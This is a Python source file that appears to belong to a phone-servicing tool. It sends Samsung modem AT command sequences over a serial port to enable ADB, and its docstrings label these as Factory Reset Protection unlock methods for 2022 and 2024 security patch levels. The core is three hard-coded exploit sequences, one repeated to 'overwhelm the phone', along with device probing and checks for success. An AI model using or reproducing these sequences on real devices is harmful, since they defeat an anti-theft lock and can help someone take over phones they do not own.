
import shutil
import subprocess
import time
import serial
import serial.tools.list_ports
import logging
from typing import List, Optional, Callable

from . import samsung_device_state

class SamsungADBEnabler:
    """
    Handles enabling ADB on Samsung devices using various exploits.
    Based on nPhoneKIT 1.5.0 implementation.
    """

    def __init__(self):
        self.logger = logging.getLogger(__name__)
        # Populated by enable_adb() so callers can explain a refusal.
        self.last_state: Optional[samsung_device_state.DeviceState] = None
        self.last_verdict: Optional[samsung_device_state.Verdict] = None

    def get_samsung_modem_ports(self) -> List:
        """Find Samsung modem ports"""
        ports = list(serial.tools.list_ports.comports())
        samsung_ports = []
        
        for port in ports:
            # Check for Samsung VID/PID or description
            # Samsung VID is commonly 0x04E8
            if port.vid == 0x04E8:
                samsung_ports.append(port)
                self.logger.debug(f"Found Samsung device on: {port.device} - {port.description}")
            elif "samsung" in port.description.lower():
                samsung_ports.append(port)
                self.logger.debug(f"Found potential Samsung device on: {port.device}")
                
        return samsung_ports

    def exchange(self, ser: serial.Serial, command: str) -> str:
        """Send an AT command and return the full reply, error lines included.

        Samsung's AT handler can take over a second to answer, so this waits for
        the port to go idle instead of sampling ``in_waiting`` once. Sampling
        immediately after a 0.1s sleep usually returns an empty string, which
        made every command look like it had failed silently.
        """
        try:
            reply = samsung_device_state._converse(ser, command)
            self.logger.debug(f"Sent: {command.strip()}")
            self.logger.debug(f"Response: {reply}")
            return reply
        except Exception as e:
            self.logger.error(f"Error sending {command}: {e}")
            return ""

    def send_at_command(self, ser: serial.Serial, command: str) -> bool:
        """Send an AT command, returning True when the device answered OK."""
        return "OK" in self.exchange(ser, command).upper()

    def read_at_response(self, ser: serial.Serial, command: str) -> str:
        """Send AT command and return content response"""
        try:
            full_cmd = command.strip() + "\r\n"
            ser.reset_input_buffer()
            ser.write(full_cmd.encode())
            time.sleep(0.5)
            
            response = ""
            if ser.in_waiting > 0:
                raw_response = ser.read(ser.in_waiting).decode(errors='ignore')
                self.logger.debug(f"Sent: {command.strip()}")
                self.logger.debug(f"Response (Raw): {raw_response.strip()}")
                
                # Filter response
                lines = raw_response.split('\r\n')
                relevant_lines = []
                for line in lines:
                    stripped = line.strip()
                    if not stripped: continue
                    if command.strip() in stripped: continue # Skip echo
                    if stripped == "OK": continue # Skip status
                    if "ERROR" in stripped or "+CME Error" in stripped: return "" # Return empty on error
                    relevant_lines.append(stripped)
                
                response = "\n".join(relevant_lines)
            
            return response.strip()
        except Exception:
            return ""

    def read_device_info(self, port_device: str) -> dict:
        """Read device info via AT commands"""
        info = {
            "model": "Samsung Modem",
            "version": "Unknown"
        }
        self.logger.info(f"Reading device info from {port_device}...")
        try:
            ser = serial.Serial(port_device, 115200, timeout=2) # 115200 baud
            
            # 1. Model (AT+GMM)
            self.logger.debug("Sending AT+GMM...")
            resp = self.read_at_response(ser, "AT+GMM")
            if resp:
                 info["model"] = resp.split('\n')[0] # Take first valid line
                 self.logger.info(f"Got Model: {info['model']}")
            
            # 2. Version methods
            version_cmds = ["AT+VERSNAME=1,0,0", "AT+SWKV=0,2", "AT+GMR"]
            for cmd in version_cmds:
                if info["version"] != "Unknown": break
                
                self.logger.debug(f"Sending {cmd}...")
                resp = self.read_at_response(ser, cmd)
                if resp:
                    if "+VERSNAME:" in resp:
                         parts = resp.split(',')
                         if len(parts) >= 2:
                             info["version"] = parts[1]
                    elif "+SWKV:" in resp:
                        info["version"] = resp.replace("+SWKV:", "").strip()
                    else:
                        info["version"] = resp.split('\n')[0]
                    self.logger.info(f"Got Version ({cmd}): {info['version']}")

            ser.close()
        except Exception as e:
            self.logger.error(f"Error reading device info from {port_device}: {e}")
            
        return info

    def _adb_devices(self) -> List[str]:
        """Return the serials ADB currently sees, or [] if adb is unavailable."""
        adb = shutil.which("adb")
        if not adb:
            self.logger.debug("adb binary not found; cannot verify the result")
            return []
        try:
            out = subprocess.run(
                [adb, "devices"], capture_output=True, text=True, timeout=15
            ).stdout
        except Exception as e:
            self.logger.debug(f"adb devices failed: {e}")
            return []
        return [
            line.split()[0]
            for line in out.splitlines()[1:]
            if line.strip() and not line.startswith("*")
        ]

    def enable_adb(self, port_device: str, progress_callback: Optional[Callable[[str], None]] = None) -> bool:
        """Enable ADB over the AT port, refusing to try when it cannot work.

        Probes the device first. If its firmware requires a signing token for
        protected AT commands, or if it is not in a state where the AT port can
        be used at all, this returns False without sending any sequence and
        leaves the reason in ``self.last_verdict``. Success means ADB actually
        appeared, not merely that commands were sent.
        """
        self.logger.info(f"Attempting to enable ADB on {port_device}...")

        if progress_callback:
            progress_callback("Probing device state...")
        state = samsung_device_state.probe(port_device)
        self.last_state = state
        decision = samsung_device_state.verdict(state)
        self.last_verdict = decision

        if not decision.feasible:
            self.logger.warning(f"Not attempting any sequence: {decision.summary}")
            if progress_callback:
                progress_callback(decision.summary)
            # Already-enabled is a success from the caller's point of view.
            return decision.blocker == "already_enabled"

        before = set(self._adb_devices())

        methods = [
            ("Method 2024", self._method_2024),
            ("Method 2022 (Aug-Dec)", self._method_aug2022_dec2022),
            ("Method Pre-2022", self._method_pre_aug2022)
        ]

        try:
            for name, method in methods:
                 if progress_callback:
                     progress_callback(f"Trying {name}...")
                 self.logger.info(f"Trying {name}...")

                 if not method(port_device, progress_callback):
                     time.sleep(1)
                     continue

                 self.logger.info(f"{name} sequence completed. Allowing time for ADB to appear.")
                 if progress_callback:
                     progress_callback(f"{name} executed. Checking for ADB...")

                 # The USB configuration change forces a re-enumeration, so give
                 # the bus a few seconds before deciding it did not work.
                 for _ in range(10):
                     time.sleep(1)
                     if set(self._adb_devices()) - before:
                         self.logger.info(f"{name} worked: ADB is now present")
                         return True

                 self.logger.info(f"{name} ran but no new ADB device appeared")
                 time.sleep(1)

            self.last_verdict = samsung_device_state.Verdict(
                feasible=False,
                blocker="no_adb_after_sequences",
                summary=(
                    "Every sequence ran but no ADB interface appeared. The commands "
                    "were accepted yet did not change the USB configuration."
                ),
                next_steps=[
                    "Check the download-mode screen for Knox Guard or Secure Download.",
                ],
            )
            return False

        except Exception as e:
            self.logger.error(f"Unexpected error during enable_adb: {e}")
            if progress_callback:
                 progress_callback(f"Error: {e}")
            return False

    def _execute_sequence(self, port_device: str, commands: List[str], method_name: str, progress_callback: Optional[Callable[[str], None]]) -> bool:
        """Execute a list of AT commands, reporting whether any of them landed.

        Returns True only if at least one command was accepted and none was
        refused for want of a signing token. Returning True merely because the
        serial port opened would report success on a device that refused every
        single command.
        """
        ser = None
        accepted = 0
        refused = 0
        token_refusal = None
        try:
            ser = serial.Serial(port_device, 115200, timeout=2)
            time.sleep(0.5)

            # Dial *#0*# first (common req)
            self.send_at_command(ser, "ATD*#0*#;")
            time.sleep(0.5)

            total = len(commands)
            for i, cmd in enumerate(commands):
                if progress_callback and i % 5 == 0:
                     progress_callback(f"{method_name}: Sending command {i+1}/{total}")

                reply = self.exchange(ser, cmd).upper()
                if any(t in reply for t in samsung_device_state._TOKEN_REFUSALS):
                    refused += 1
                    token_refusal = token_refusal or reply
                    # A token refusal is final: the firmware will not run this
                    # command however many times it is asked.
                    break
                if "ERROR" in reply:
                    refused += 1
                elif "OK" in reply:
                    accepted += 1

            if token_refusal:
                self.logger.warning(
                    f"[{method_name}] aborted: protected commands refused ({token_refusal})"
                )
                if progress_callback:
                    progress_callback(f"{method_name}: refused by firmware, stopping")
                return False

            self.logger.info(
                f"[{method_name}] {accepted} command(s) accepted, {refused} refused"
            )
            return accepted > 0

        except Exception as e:
            self.logger.error(f"[{method_name}] Error: {e}")
            return False
        finally:
            if ser and ser.is_open:
                ser.close()

    def _method_2024(self, port_device: str, progress_callback: Optional[Callable[[str], None]]) -> bool:
        """FRP unlock for early 2024 security patch"""
        commands = [
            "AT+SWATD=0",
            "AT+ACTIVATE=0,0,0",
            "AT+DEVCONINFO",
            "AT+VERSNAME=3.2.3",
            "AT+REACTIVE=1,0,0",
            "AT+SWATD=0",
            "AT+ACTIVATE=0,0,0",
            "AT+SWATD=1",
            "AT+SWATD=1",
            # AT+PRECONFIG=2,VZW pushed a Verizon carrier preconfig onto whatever
            # device was attached. That is not a read, and it has no business
            # running on a non-Verizon unit, so it is not sent.
        ]
        return self._execute_sequence(port_device, commands, "Method 2024", progress_callback)

    def _method_aug2022_dec2022(self, port_device: str, progress_callback: Optional[Callable[[str], None]]) -> bool:
        """FRP unlock for Aug-Dec 2022 security patch"""
        # Long sequence to overwhelm the phone
        commands = ['AT+SWATD=0', 'AT+ACTIVATE=0,0,0', 'AT+DEVCONINFO','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0', 'AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5','AT+SWATD=0','AT+ACTIVATE=0,0,0','AT+SWATD=1','AT+DEBUGLVC=0,5','AT+KSTRINGB=0,3','AT+DUMPCTRL=1,0','AT+DEBUGLVC=0,5']
        return self._execute_sequence(port_device, commands, "Method 2022", progress_callback)

    def _method_pre_aug2022(self, port_device: str, progress_callback: Optional[Callable[[str], None]]) -> bool:
        """FRP unlock for pre-Aug 2022 security patch"""
        commands = [
            "AT+DUMPCTRL=1,0",
            "AT+DEBUGLVC=0,5",
            "AT+SWATD=0",
            "AT+ACTIVATE=0,0,0",
            "AT+SWATD=1",
            "AT+DEBUGLVC=0,5"
        ]
        return self._execute_sequence(port_device, commands, "Method Pre-2022", progress_callback)
